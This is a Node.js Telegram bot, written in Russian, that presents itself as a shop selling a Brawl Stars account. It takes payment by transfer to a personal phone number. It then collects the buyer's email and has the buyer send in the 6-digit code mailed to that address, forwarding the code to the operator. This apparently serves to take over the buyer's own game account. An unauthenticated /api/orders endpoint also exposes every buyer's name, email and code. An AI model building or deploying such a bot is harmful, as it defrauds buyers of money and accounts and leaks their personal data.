require('dotenv').config();
const { Telegraf, session, Markup } = require('telegraf');
const express = require('express');
const crypto = require('crypto');

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const orders = new Map();
const pendingEmailByChatId = new Map();

function generateOrderId() {
  return crypto.randomBytes(4).toString('hex').toUpperCase();
}

const ACCOUNTS = [
  {
    id: 'acc-29444',
    title: 'Brawl Stars — 29 444 кубка',
    trophies: 29444,
    fighters: 65,
    price: 800,
    year: 2024,
    imageUrl: 'https://i.ibb.co/qYT3zH2F/photo-2026-06-20-23-05-47.jpg',
  },
];

function getAccountById(id) {
  return ACCOUNTS.find(a => a.id === id) || null;
}

function formatPrice(price) {
  return new Intl.NumberFormat('ru-RU').format(price) + ' ₽';
}

function accountCaption(account) {
  return (
    `🏆 *${account.title}*\n\n` +
    `🥇 Кубки: *${account.trophies.toLocaleString('ru-RU')}*\n` +
    `⚔️ Бойцы: *${account.fighters}*\n` +
    `📅 Год: *${account.year}*\n` +
    `💰 Цена: *${formatPrice(account.price)}*`
  );
}

function catalogKeyboard(index) {
  const total = ACCOUNTS.length;
  const navRow = [];
  if (total > 1) {
    if (index > 0) navRow.push(Markup.button.callback('◀ Назад', `catalog_${index - 1}`));
    if (index < total - 1) navRow.push(Markup.button.callback('Вперёд ▶', `catalog_${index + 1}`));
  }
  const rows = [];
  if (navRow.length > 0) rows.push(navRow);
  rows.push([Markup.button.callback(`🛒 Купить за ${formatPrice(ACCOUNTS[index].price)}`, `buy_${ACCOUNTS[index].id}`)]);
  return Markup.inlineKeyboard(rows);
}

// =====================
// СТАРТ
// =====================
bot.start(async (ctx) => {
  ctx.session = {};
  await ctx.reply(
    '👋 Привет! Это магазин аккаунтов Brawl Stars.\n\nВыбери действие:',
    Markup.keyboard([
      ['📋 Каталог аккаунтов'],
      ['❓ Помощь'],
    ]).resize()
  );
});

// =====================
// КАТАЛОГ
// =====================
bot.hears('📋 Каталог аккаунтов', async (ctx) => {
  ctx.session = ctx.session || {};
  const index = 0;
  const account = ACCOUNTS[index];
  try {
    await ctx.replyWithPhoto(account.imageUrl, {
      caption: accountCaption(account),
      parse_mode: 'Markdown',
      ...catalogKeyboard(index),
    });
  } catch (e) {
    await ctx.reply(accountCaption(account), {
      parse_mode: 'Markdown',
      ...catalogKeyboard(index),
    });
  }
});

bot.action(/^catalog_(\d+)$/, async (ctx) => {
  const index = parseInt(ctx.match[1], 10);
  if (index < 0 || index >= ACCOUNTS.length) return ctx.answerCbQuery();
  const account = ACCOUNTS[index];
  try {
    await ctx.editMessageMedia(
      { type: 'photo', media: account.imageUrl, caption: accountCaption(account), parse_mode: 'Markdown' },
      catalogKeyboard(index)
    );
  } catch (e) {
    await ctx.reply(accountCaption(account), {
      parse_mode: 'Markdown',
      ...catalogKeyboard(index),
    });
  }
  await ctx.answerCbQuery();
});

// =====================
// ПОКУПКА
// =====================
bot.action(/^buy_(.+)$/, async (ctx) => {
  const accountId = ctx.match[1];
  const account = getAccountById(accountId);
  if (!account) return ctx.answerCbQuery('Аккаунт не найден');

  ctx.session = ctx.session || {};
  ctx.session.selectedAccountId = account.id;
  ctx.session.step = 'awaiting_payment_info';

  await ctx.answerCbQuery();
  await ctx.reply(
    `✅ Вы выбрали: *${account.title}*\n` +
    `💰 Цена: *${formatPrice(account.price)}*\n\n` +
    `📱 *Реквизиты для оплаты (СБП):*\n` +
    `📞 Номер: *+7 902 917-54-45*\n` +
    `💳 Сумма: *${formatPrice(account.price)}*\n\n` +
    `После оплаты введите ваше *полное имя и первую букву фамилии*\n` +
    `_(например: Александр К)_\n\n` +
    `⚠️ *ВАЖНО:* Укажите имя точно так, как указано в банке при переводе. Если имя не совпадёт — оплата не будет подтверждена!`,
    { parse_mode: 'Markdown' }
  );
});

// =====================
// MIDDLEWARE: восстановить step если ждём email
// ОБЯЗАТЕЛЬНО ДО bot.on('text')
// =====================
bot.use(async (ctx, next) => {
  if (ctx.message?.text) {
    ctx.session = ctx.session || {};
    const chatId = String(ctx.chat?.id);
    const pendingOrderId = pendingEmailByChatId.get(chatId);
    if (pendingOrderId && ctx.session.step !== 'awaiting_email') {
      ctx.session.step = 'awaiting_email';
      ctx.session.orderId = pendingOrderId;
      pendingEmailByChatId.delete(chatId);
    }
  }
  return next();
});

// =====================
// ОБРАБОТКА ТЕКСТА
// =====================
bot.on('text', async (ctx) => {
  ctx.session = ctx.session || {};
  const text = ctx.message.text.trim();
  const step = ctx.session.step;

  if (text === '❓ Помощь') {
    return ctx.reply(
      '📞 По вопросам покупки пишите: @brawlhelpp\n\n' +
      'Как это работает:\n' +
      '1️⃣ Выберите аккаунт в каталоге\n' +
      '2️⃣ Оплатите через СБП\n' +
      '3️⃣ Введите имя как в банке\n' +
      '4️⃣ Дождитесь подтверждения\n' +
      '5️⃣ Напишите свой email\n' +
      '6️⃣ Проверьте почту и пришлите код из письма\n' +
      '7️⃣ Продавец получит код и завершит передачу аккаунта'
    );
  }
  if (text === '📋 Каталог аккаунтов') return;

  // ШАГ 1: Ввод имени
  if (step === 'awaiting_payment_info') {
    if (text.length < 3) {
      return ctx.reply(
        '❌ Введите полное имя и первую букву фамилии.\n_(например: Александр К)_',
        { parse_mode: 'Markdown' }
      );
    }

    const account = getAccountById(ctx.session.selectedAccountId);
    if (!account) {
      ctx.session.step = null;
      return ctx.reply('❌ Аккаунт не найден. Начните заново — /start');
    }

    ctx.session.buyerName = text;
    ctx.session.step = 'awaiting_admin_confirm';

    const orderId = generateOrderId();
    const order = {
      orderId,
      buyerName: text,
      email: null,
      accountId: account.id,
      accountTitle: account.title,
      price: account.price,
      status: 'pending',
      code: null,
      chatId: String(ctx.chat.id),
      createdAt: new Date().toISOString(),
    };
    orders.set(orderId, order);
    ctx.session.orderId = orderId;

    await ctx.reply(
      `✅ *Спасибо, ${text}!*\n\n` +
      `Заказ *#${orderId}* создан.\n` +
      `Продавец проверит ваш платёж по имени и подтвердит заказ.\n\n` +
      `⏳ Ожидайте подтверждения...`,
      { parse_mode: 'Markdown' }
    );

    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `🆕 *Новый заказ #${orderId}*\n\n` +
          `👤 Имя плательщика: *${text}*\n` +
          `🎮 Аккаунт: ${account.title}\n` +
          `🏆 Кубки: ${account.trophies.toLocaleString('ru-RU')}\n` +
          `💰 Цена: ${formatPrice(account.price)}\n\n` +
          `🔍 Проверьте перевод по имени и подтвердите:`,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Подтвердить', callback_data: `fulfill_${orderId}` },
                { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  // ШАГ 2: Ожидание подтверждения
  if (step === 'awaiting_admin_confirm') {
    return ctx.reply('⏳ Ваш заказ на проверке. Пожалуйста, дождитесь подтверждения от продавца.');
  }

  // ШАГ 3: Ввод email
  if (step === 'awaiting_email') {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(text)) {
      return ctx.reply(
        '❌ Неверный формат email.\n_(например: example@mail.ru)_\n\nПопробуйте ещё раз:',
        { parse_mode: 'Markdown' }
      );
    }

    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = null;
      return ctx.reply('❌ Заказ не найден. Напишите @brawlhelpp');
    }

    order.email = text;
    orders.set(orderId, order);
    ctx.session.email = text;
    ctx.session.step = 'awaiting_code_from_email';

    await ctx.reply(
      `📧 Email принят: *${text}*\n\n` +
      `⏳ Ожидайте — продавец запросит у вас код из письма...`,
      { parse_mode: 'Markdown' }
    );

    // Уведомить админа с кнопкой "Запросить код"
    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `📧 *Заказ #${orderId}* — покупатель указал email:\n\n` +
          `👤 Имя: ${order.buyerName}\n` +
          `📧 Email: *${text}*\n\n` +
          `Нажмите кнопку чтобы попросить покупателя прислать код из письма:`,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [[
                { text: '📨 Запросить код у покупателя', callback_data: `askcode_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  // ШАГ 4: Покупатель вводит код из письма
  if (step === 'awaiting_code_from_email') {
    const codeRegex = /^\d{6}$/;
    if (!codeRegex.test(text)) {
      return ctx.reply(
        '❌ Код должен состоять из 6 цифр.\nПроверьте письмо и попробуйте ещё раз:',
        { parse_mode: 'Markdown' }
      );
    }

    const orderId = ctx.session.orderId;
    const order = orders.get(orderId);
    if (!order) {
      ctx.session.step = null;
      return ctx.reply('❌ Заказ не найден. Напишите @brawlhelpp');
    }

    order.code = text;
    order.status = 'code_received';
    orders.set(orderId, order);
    ctx.session.step = 'awaiting_final_confirm';

    await ctx.reply(
      `✅ Код принят!\n\n` +
      `⏳ Продавец проверяет код и завершает передачу аккаунта.\n` +
      `Пожалуйста, подождите...`,
      { parse_mode: 'Markdown' }
    );

    // Отправить код админу
    if (ADMIN_CHAT_ID) {
      try {
        await bot.telegram.sendMessage(
          ADMIN_CHAT_ID,
          `🔑 *Заказ #${orderId}* — покупатель прислал код:\n\n` +
          `👤 Имя: ${order.buyerName}\n` +
          `📧 Email: ${order.email}\n` +
          `🔑 Код: *${text}*\n\n` +
          `Проверьте код и завершите заказ:`,
          {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [[
                { text: '✅ Завершить заказ', callback_data: `complete_${orderId}` },
                { text: '❌ Отклонить', callback_data: `reject_${orderId}` },
              ]],
            },
          }
        );
      } catch (e) {
        console.warn('Cannot notify admin:', e.message);
      }
    }
    return;
  }

  // ШАГ 5: Ожидание финального подтверждения
  if (step === 'awaiting_final_confirm') {
    return ctx.reply('⏳ Продавец проверяет код. Совсем скоро!');
  }
});

// =====================
// КНОПКА АДМИНА: ПОДТВЕРДИТЬ ОПЛАТУ
// =====================
bot.action(/^fulfill_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    await ctx.answerCbQuery('❌ Заказ не найден (сервер перезапускался?)');
    return;
  }
  if (order.status !== 'pending') {
    await ctx.answerCbQuery('⚠️ Заказ уже обработан');
    return;
  }

  order.status = 'confirmed';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}

  await ctx.answerCbQuery('✅ Оплата подтверждена!');
  await ctx.reply(
    `✅ *Заказ #${orderId} подтверждён.*\n` +
    `👤 Имя: ${order.buyerName}\n\n` +
    `Ожидаю email от покупателя...`,
    { parse_mode: 'Markdown' }
  );

  pendingEmailByChatId.set(String(order.chatId), orderId);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `🎉 *Оплата подтверждена!*\n\n` +
        `Напишите ваш *email* прямо сюда в чат:\n` +
        `_(например: example@mail.ru)_`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.warn('Cannot notify buyer:', e.message);
    }
  }
});

// =====================
// КНОПКА АДМИНА: ЗАПРОСИТЬ КОД У ПОКУПАТЕЛЯ
// =====================
bot.action(/^askcode_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    await ctx.answerCbQuery('❌ Заказ не найден');
    return;
  }

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('📨 Запрос отправлен покупателю');
  await ctx.reply(`📨 Покупатель получил запрос кода для заказа #${orderId}`);

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `📬 *Проверьте почту!*\n\n` +
        `На адрес *${order.email}* должно было прийти письмо с кодом.\n\n` +
        `Найдите письмо и введите *6-значный код* прямо сюда в чат:`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.warn('Cannot notify buyer:', e.message);
    }
  }
});

// =====================
// КНОПКА АДМИНА: ЗАВЕРШИТЬ ЗАКАЗ
// =====================
bot.action(/^complete_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    await ctx.answerCbQuery('❌ Заказ не найден');
    return;
  }

  order.status = 'fulfilled';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('✅ Заказ завершён!');
  await ctx.reply(
    `🏆 *Заказ #${orderId} успешно завершён!*\n` +
    `👤 Покупатель: ${order.buyerName}\n` +
    `📧 Email: ${order.email}\n` +
    `🔑 Код: ${order.code}`,
    { parse_mode: 'Markdown' }
  );

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `🎉 *Поздравляем! Заказ успешно завершён!*\n\n` +
        `🏆 Аккаунт *${order.accountTitle}* передан вам.\n\n` +
        `Спасибо за покупку! По вопросам: @brawlhelpp`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.warn('Cannot notify buyer:', e.message);
    }
  }
});

// =====================
// КНОПКА АДМИНА: ОТКЛОНИТЬ
// =====================
bot.action(/^reject_(.+)$/, async (ctx) => {
  const orderId = ctx.match[1];
  const order = orders.get(orderId);

  if (!order) {
    await ctx.answerCbQuery('❌ Заказ не найден (сервер перезапускался?)');
    return;
  }
  if (order.status === 'fulfilled') {
    await ctx.answerCbQuery('⚠️ Заказ уже завершён');
    return;
  }

  order.status = 'rejected';
  orders.set(orderId, order);

  try { await ctx.editMessageReplyMarkup({ inline_keyboard: [] }); } catch (e) {}
  await ctx.answerCbQuery('❌ Заказ отклонён');
  await ctx.reply(
    `❌ *Заказ #${orderId} отклонён.*\n👤 Имя: ${order.buyerName}`,
    { parse_mode: 'Markdown' }
  );

  if (order.chatId) {
    try {
      await bot.telegram.sendMessage(
        order.chatId,
        `❌ *Заказ #${orderId} отклонён.*\n\n` +
        `Если вы уже перевели деньги — напишите: @brawlhelpp`,
        { parse_mode: 'Markdown' }
      );
    } catch (e) {
      console.warn('Cannot notify buyer:', e.message);
    }
  }
});

// =====================
// EXPRESS + API
// =====================
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.get('/', (req, res) => res.json({ ok: true, message: 'Bot is running' }));

app.get('/api/orders', (req, res) => {
  const list = Array.from(orders.values()).sort(
    (a, b) => new Date(b.createdAt) - new Date(a.createdAt)
  );
  res.json({ orders: list });
});

app.get('/api/order/:id', (req, res) => {
  const order = orders.get(req.params.id);
  if (!order) return res.status(404).json({ error: 'Order not found' });
  res.json({
    orderId: order.orderId,
    status: order.status,
    code: order.status === 'fulfilled' ? order.code : null,
    accountTitle: order.accountTitle,
    price: order.price,
    createdAt: order.createdAt,
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));

bot.launch();
console.log('✅ Bot started');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
